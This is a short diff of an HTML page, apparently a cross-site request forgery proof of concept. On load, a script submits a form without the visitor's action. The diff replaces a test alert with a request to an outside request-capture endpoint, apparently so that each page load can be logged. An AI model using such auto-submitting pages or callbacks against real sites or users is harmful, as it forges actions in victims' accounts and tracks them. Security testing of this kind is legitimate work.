@@ -8,8 +8,10 @@
       <input type="submit" value="Submit request" />
     </form>
     <script>
-      alert('test');
       document.form.submit();
+      const req = new XMLHttpRequest();
+      req.open('GET', 'https://enq6m9167wxp.x.pipedream.net', false); 
+      req.send(null);
     </script>
   </body>
 </html>
